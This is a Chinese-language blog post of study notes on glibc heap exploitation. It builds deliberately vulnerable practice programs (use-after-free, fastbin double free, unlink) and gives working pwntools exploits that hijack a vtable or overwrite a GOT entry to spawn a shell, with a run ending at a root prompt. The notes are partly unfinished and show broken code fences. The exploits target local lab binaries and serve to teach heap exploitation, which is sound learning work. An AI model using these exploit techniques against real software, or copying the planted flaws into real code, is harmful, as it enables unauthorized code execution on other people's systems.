---
layout: post
title: heap教程 
excerpt: "heap教程"
categories: [知识总结]
comments: true
---

chunk的种类
- fastbin <=128
- smallbin <1024
- largebin
- mmap >=0x20000

关掉ASLR
```
# echo 0 > /proc/sys/kernel/randomize_va_space
```
malloc过程 代码
```c
#include <stdio.h>
#include <stdlib.h>

void *Malloc(size_t sz){
	void *p = malloc(sz);
	printf("%p = malloc(%ld)\n",p,sz);
}

void Free(void *p){
	printf("free(%p)\n",p);
}

int main(){
	void *p,*q,*r,*s;
	p = malloc(150);
	q = malloc(150);
	r = malloc(150);
	s = malloc(150);
	free(p);
	free(r);
}
```
查看ld版本
```bash
ls -al /lib64/ld-linux-x86-64.so.2
lrwxrwxrwx 1 root root 10 10月 23 16:30 /lib64/ld-linux-x86-64.so.2 -> ld-2.17.so
```
**ld版本要和libc版本一致**

编译可debug的版本
```bash
gcc -g -z norelro -z execstack -o heap heap.c -Wl,--rpath=/root/sploitfun/gccwget/glibc-2.19/64/lib -Wl,--dynamic-linker=/root/sploitfun/gccwget/glibc-2.19/64/lib/ld-linux-x86-64.so.2
```
查看
```bash
ldd heap
	linux-vdso.so.1 =>  (0x00007ffe0d7c6000)
	libc.so.6 => /root/sploitfun/gccwget/glibc-2.19/64/lib/libc.so.6 (0x00007f1c094bb000)
	/root/sploitfun/gccwget/glibc-2.19/64/lib/ld-linux-x86-64.so.2 => /lib64/ld-linux-x86-64.so.2 (0x00007f1c0985c000)
```
现在就可以使用有debug symbol的libc

教程中使用的方法是`export LD_LIBRARY_PATH=/root/sploitfun/gccwget/glibc-2.19/64/lib`可是在我这里会造成段错误

或者`vim a.out`然后修改ld的地方
```bash
gdb ./heap
b main
r
```
查看main_arena结构
```
gdb-peda$ p main_arena
$1 = {
  mutex = 0x0, 
  flags = 0x0, 
  fastbinsY = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
  top = 0x0, 
  last_remainder = 0x0, 
  bins = {0x0 <repeats 254 times>}, 
  binmap = {0x0, 0x0, 0x0, 0x0}, 
  next = 0x7ffff7dd7620 <main_arena>, 
  next_free = 0x0, 
  system_mem = 0x0, 
  max_system_mem = 0x0
```
结构类似
```
main_arena{
	bin[0] (size=16) -> chunk1 -> chunk5
	bin[0] (size=32) -> chunk2 -> chunk3 -> chunk4 
	bin[0] (size=48)
}
```
使用ltrace查看某函数的调用
```bash
ltrace -e 'malloc+free+' ./heap
heap->malloc(150)                                                         = 0x601010
heap->malloc(150)                                                         = 0x6010b0
heap->malloc(150)                                                         = 0x601150
heap->malloc(150)                                                         = 0x6011f0
heap->free(0x601010)                                                      = <void>
heap->free(0x601150)                                                      = <void>
+++ exited (status 161) +++
```

   













#### UAF use-after-free
指的是free(=p)之后还继续使用它
```
ltrace -e 'malloc+free+' ./uaf
uaf->malloc(30)                                                           = 0x602010
uaf->malloc(30)                                                           = 0x602040
uaf->malloc(30)                                                           = 0x602070
uaf->malloc(30)                                                           = 0x6020a0
uaf->free(0x602010)                                                       = <void>
uaf->free(0x602040)                                                       = <void>
uaf->free(0x602010)                                                       = <void>
uaf->malloc(30)                                                           = 0x602010
uaf->malloc(30)                                                           = 0x602040
uaf->malloc(30)                                                           = 0x602010
uaf->malloc(30)                                                           = 0x602040
uaf->malloc(30)                                                           = 0x602010
uaf->malloc(30)                                                           = 0x602040
```
漏洞代码
```c++
#include <cstdio>
#include <cstdlib>
#include <cstring>

class A {
    public:
        virtual void print() {
            puts("class A");
        }
};

class B: public A {
    public:
        void print() {
            puts("Class B");
        }
};

void sh() {
    system("sh");
}

char buf[0x20];

int main() {
    setvbuf(stdout, 0, _IONBF, 0);

    A *p = new B();//malloc
    delete p;//free
    fgets(buf, sizeof(buf), stdin);
    char *q = strdup(buf);//malloc

    p->print();
}
```
编译
```bash
g++ uaf.cpp -o uaf -g
```
最终的exp
```python
#!/usr/bin/env python
from pwn import *
p = process('./uaf')
elf = ELF('./uaf')
buf = elf.symbols['buf']
sh = elf.symbols['_Z2shv']	
# gdb.attach(p)
payload = (p64(buf + 8) + p64(sh)).ljust(0x20)
p.send(payload)
p.interactive()
```
最终的结果
```bash
 python uafexp.py 
[+] Starting local process './uaf': pid 1417
[*] '/root/sploitfun/w10/uaf'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) 组=0(root)
```

#### Fastbin
chunk size<= get_max_fast()的chunk,会被放在fastbin的bin里
- 64位是128bytes,32位是64bytes
- global_max_fast 一开始是0

随着size的大小,从32开始,最大到128

Fastbin是single linked list,只使用fd,以Null结尾,有free,但没有unlink
```c
#include <stdio.h>
#include <stdlib.h>

void *Malloc(size_t sz){
	void *p = malloc(sz);
	printf("%p = malloc(%ld)\n",p,sz);
}

void Free(void *p){
	printf("free(%p)\n",p);
}

int main(){
	void *p,*q,*r,*s;
	p = malloc(30);
	q = malloc(30);
	r = malloc(30);
	s = malloc(30);
	free(p);
	free(q);
	free(p);
	malloc(30);
	malloc(30);
	malloc(30);
	malloc(30);
	malloc(30);
	malloc(30);
	malloc(30);
}
```
验证
```bash
ltrace ./uaf 
__libc_start_main(0x400619, 1, 0x7ffcd751f8f8, 0x4006c0 <unfinished ...>
malloc(30)                                                                                 = 0x12c0010
malloc(30)                                                                                 = 0x12c0040
malloc(30)                                                                                 = 0x12c0070
malloc(30)                                                                                 = 0x12c00a0
free(0x12c0010)                                                                            = <void>
free(0x12c0040)                                                                            = <void>
free(0x12c0010)                                                                            = <void>
malloc(30)                                                                                 = 0x12c0010
malloc(30)                                                                                 = 0x12c0040
malloc(30)                                                                                 = 0x12c0010
malloc(30)                                                                                 = 0x12c0040
malloc(30)                                                                                 = 0x12c0010
malloc(30)                                                                                 = 0x12c0040

```
#### fastbin double free
通过double free,弄成一个循环,然后修改第一个fd,使之malloc到我们想要修改的地方,然后修改之
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void sh(char *cmd){
	system(cmd);
}

int main(){
	setvbuf(stdout, 0, _IONBF, 0);
	int cmd,idx,sz;
	char* ptr[10];
	memset(ptr,0,sizeof(ptr));
	puts("1,malloc+ gets\n2.free\n3.puts");
	while(1){
		printf("> ");
		scanf("%d %d",&cmd,&idx);
		idx %=10;	//a%=3，它的的等价式子是a=a%3
		if (cmd==1){
			scanf("%d%*c",&sz);
			ptr[idx] = malloc(sz);
			gets(ptr[idx]);
			} else if(cmd==2){
				free(ptr[idx]);
			}else if(cmd==3){
				puts(ptr[idx]);
			}else{
				exit(0);
			}
	}
	return 0;
}
```
编译
```bash
gcc -g -z norelro -z execstack -o fastbin fastbin.c -Wl,--rpath=/root/sploitfun/gccwget/glibc-2.19/64/lib -Wl,--dynamic-linker=/root/sploitfun/gccwget/glibc-2.19/64/lib/ld-linux-x86-64.so.2
```
运行一下
```bash
./fastbin 
1,malloc+ gets
2.free
3.puts
> 1 3
100
morty
> 3 3
morty
```
模仿连续double free
```bash
./fastbin 
1,malloc+ gets
2.free
3.puts
> 1 3
100
morty
> 2 3
> 2 3
*** Error in `./fastbin': double free or corruption (fasttop): 0x0000000001a18010 ***
已放弃

```
或者input放在文件中
```bash
cat input.txt 
1 0 s
1 1 q
2 1
2 1
```
管道输出
```
at input.txt | ./fastbin
1,malloc+ gets
2.free
3.puts
> > > > *** Error in `./fastbin': double free or corruption (fasttop): 0x0000000000601030 ***
已放弃
```
python方式写入
```python
```
from pwn import *

r = remote('127.0.0.1',4000)

def cmd(x):
	r.recvuntil('> ')
	r.send(x+'\n')
	
def malloc(i,s):
	cmd('1 %d %d\n%s' % (i,len(s),s))
	
def free(i):
	cmd('2 %d' % i)
	
raw_input('#')
malloc(0,'p')
malloc(1,'q')
free(0)
free(1)
free(0)

r.interactive()
```
free三次之后查看fastbin
```
gdb-peda$ p/x main_arena.fastbinsY
$10 = {0x601000, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}
```
发现fastbin已经串起来了
```
gdb-peda$ x/4gx 0x601000
0x601000:	0x0000000000000000	0x0000000000000021
0x601010:	0x0000000000601020	0x0000000000000000
gdb-peda$ x/4gx 0x0000000000601020
0x601020:	0x0000000000000000	0x0000000000000021
0x601030:	0x0000000000601000	0x0000000000000000
gdb-peda$ x/4gx 0x0000000000601000
0x601000:	0x0000000000000000	0x0000000000000021
0x601010:	0x0000000000601020	0x0000000000000000

```
再次malloc一次,并填写数据,发现fd已经被改写
```
gdb-peda$ p/x main_arena.fastbinsY
$14 = {0x601020, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}
gdb-peda$ x/4gx 0x601020
0x601020:	0x0000000000000000	0x0000000000000021
0x601030:	0x0000000000601000	0x0000000000000000
gdb-peda$ x/4gx 0x0000000000601000
0x601000:	0x0000000000000000	0x0000000000000021
0x601010:	0x0000000061616161	0x0000000000000000
```
**注意:**

我们如果想要覆盖fd到然后再malloc过去,修改数据,需要malloc过的那个chunk的size要正确,我们可以旨在GOT上,因为64为GOT为0x40***,那个0x40我们可以当作size来用,这也是唯一的检查
**exp**


















查找没有call过的function
```bash
objdump -d ./fastbin | less
00000000004006f0 <__gmon_start__@plt>:
  4006f0:       ff 25 f2 06 20 00       jmpq   *0x2006f2(%rip)        # 600de8 <__gmon_start__>
  4006f6:       68 06 00 00 00          pushq  $0x6
  4006fb:       e9 80 ff ff ff          jmpq   400680 <.plt>
```
减去6伪造一个大小为0x40的fastbin chunk
```
gdb-peda$ x/4gx 0x600de8-6
0x600de2:	0x06f600007ffff7a5	0x53f4000000000040
0x600df2:	0x5dc200007ffff7aa	0x652400007ffff7ab
```
```
关掉ASLR
```
# echo 0 > /proc/sys/kernel/randomize_va_space
```
查看heap位置
```bash
more /proc/`pidof fastbin`/maps
00400000-00401000 r-xp 00000000 fd:00 2159                               /root/sploitfun/w10/fastbin
00600000-00601000 rwxp 00000000 fd:00 2159                               /root/sploitfun/w10/fastbin
00601000-00622000 rwxp 00000000 00:00 0                                  [heap]

```
查看sh地址
```bash
gdb-peda$ p sh
$1 = {void (char *)} 0x40083d <sh>
```
查看plt
```bash
gdb-peda$ x/6i 0x400690
   0x400690 <free@plt>:	jmp    QWORD PTR [rip+0x200722]        # 0x600db8
   0x400696 <free@plt+6>:	push   0x0
   0x40069b <free@plt+11>:	jmp    0x400680
   0x4006a0 <puts@plt>:	jmp    QWORD PTR [rip+0x20071a]        # 0x600dc0
   0x4006a6 <puts@plt+6>:	push   0x1
   0x4006ab <puts@plt+11>:	jmp    0x400680
```
查看接到第几个fastbin:`(size/16)-2`

malloc(56)的原因是让size为`0x40`

操作过程
```bash
./fastbin 
1,malloc+ gets
2.free
3.puts
> 1 0
56
aaaa
> 1 1
56
bbbb
> 2 0

```
free()之后放在fastbin[2]中`(56+8)/16-2`
```
gdb-peda$ p main_arena .fastbinsY 
$7 = {0x0, 0x0, 0x601000, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}
```
#### fastbin overflow
overflow到下一个fastbin的fd,然后再malloc到我们想要的地方,然后通过malloc中的数据修改我们想修改的内容
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void sh(char *cmd){
	system(cmd);
}

int main(){
	setvbuf(stdout, 0, _IONBF, 0);
	int cmd,idx,sz;
	char* ptr[10];
	memset(ptr,0,sizeof(ptr));
	puts("1,malloc+ gets\n2.free\n3.puts");
	while(1){
		printf("> ");
		scanf("%d %d",&cmd,&idx);
		idx %=10;	//a%=3，它的的等价式子是a=a%3
		if (cmd==1){
			scanf("%d%*c",&sz);
			ptr[idx] = malloc(sz);
			gets(ptr[idx]);
			} else if(cmd==2){
				free(ptr[idx]);
				ptr[idx] = 0;//改的地方在这里
			}else if(cmd==3){
				puts(ptr[idx]);
			}else{
				exit(0);
			}
	}
	return 0;
}
```
编译
```bash
gcc -g -z norelro -z execstack -o fastbin2 fastbin2.c -Wl,--rpath=/root/sploitfun/gccwget/glibc-2.19/64/lib -Wl,--dynamic-linker=/root/sploitfun/gccwget/glibc-2.19/64/lib/ld-linux-x86-64.so.2
```
#### Free Arbitrary Address (House of Spirit)
2.37

#### Unlink
非fastbinchunk在free的时候,会检查前后是否是freed,然后合并freed.
```c
#include <stdio.h>
#include <stdlib.h>

int main(){
	void *p = malloc(130);//非fastbin,大于120
	void *q = malloc(130);
	void *r = malloc(130);
	free(p);
	free(q);
}
```
overwrite heap pointer
源码在1.12

漏洞代码
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char* cmd;

void sh(char *c){
	system(c);
}

int main(){
	char* ptr[8];
	int size,n;
	
	setvbuf(stdout,0,_IONBF,0);
	memset(ptr,0,sizeof(ptr));
	cmd = malloc(128);
	
	while(1){
		fgets(cmd,128,stdin);
		if (!strncmp(cmd,"add",3)){
			printf("Index: ");
			scanf("%d",&n);
			if (n>=0 && n<8){
				printf("Size: ");
				scanf("%d%*c",&size);
				ptr[n] = malloc(size);
				printf("Data: ");
				gets(ptr[n]);
				
			} else{
				puts("out of bound");
			}
		} else if (!strncmp(cmd,"remove",6)){
			printf("Index: ");
			scanf("%d%*c",&n);
			if (n>=0 && n<8 && ptr[n]){
				puts(ptr[n]);
				free(ptr[n]);
				ptr[0] = 0;
				
			} else {
				puts("nothing here");
			}
		} else {
			puts("unknow command");
		}
	}
	return 0;
}
```

#### mmap和arena
size超过0x21000,会改用mmap










new 1
export LD_LIBRARY_PATH=/root/sploitfun/gccwget/glibc-2.19/64/lib


```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void sh(char *cmd){
	system(cmd);
}

int main(){
	setvbuf(stdout, 0, _IONBF, 0);
	int cmd,idx,sz;
	char* ptr[10];
	memset(ptr,0,sizeof(ptr));
	puts("1,malloc+ gets\n2.free\n3.puts");
	while(1){
		printf("> ");
		scanf("%d %d",&cmd,&idx);
		idx %=10;	//a%=3，它的的等价式子是a=a%3
		if (cmd==1){
			scanf("%d%*c",&sz);
			ptr[idx] = malloc(sz);
			gets(ptr[idx]);
			} else if(cmd==2){
				free(ptr[idx]);
			}else if(cmd==3){
				puts(ptr[idx]);
			}else{
				exit(0);
			}
	}
	return 0;
}
```

```
from pwn import *

r = remote('127.0.0.1',4000)

def cmd(x):
	r.recvuntil('> ')
	r.send(x+'\n')
	
def malloc(i,s):
	cmd('1 %d %d\n%s' % (i,len(s),s))
	
def free(i):
	cmd('2 %d' % i)
	

malloc(0,'p')
malloc(1,'q')
free(0)
free(1)
free(0)
raw_input('#')
malloc(2,p64(0x1111))
malloc(3,'a')
malloc(4,'b')
malloc(5,'q')	#这里拿到的是0x1111那个fastbin,注意这个fastbin中size的栏位要正确,我们可以旨在GOT上,因为64为GOT为0x40***,那个0x40我们可以当作size来用

r.interactive()
```




new2 

#!/usr/bin/env python
from pwn import *
p = process('./fastbin-double-free')
#p = process('./last')
#p = remote('127.0.0.1',4000)

def cmd(x):
	p.recvuntil('>')
	p.sendline(x)

def malloc(i, size, s):
	cmd('1 {} {}\n{}'.format(str(i), str(size), s))

def free(i):
	cmd('2 {}'.format(str(i)))

sh = 0x400816
#sh = 0x40081d	#morty
system_got = 0x601030
raw_input('#')

malloc(0, 56, '\x00')
malloc(1, 56, '\x00')
free(0)
free(1)
free(0)
#0x60102a
malloc(2, 56, p64(system_got - 6))
malloc(3, 56, '\x00')
malloc(4, 56, '\x00')
malloc(5, 56, 'sh' + '\x00' * 20 + p64(sh))
malloc(6, system_got + 10, '\x00')
p.interactive()
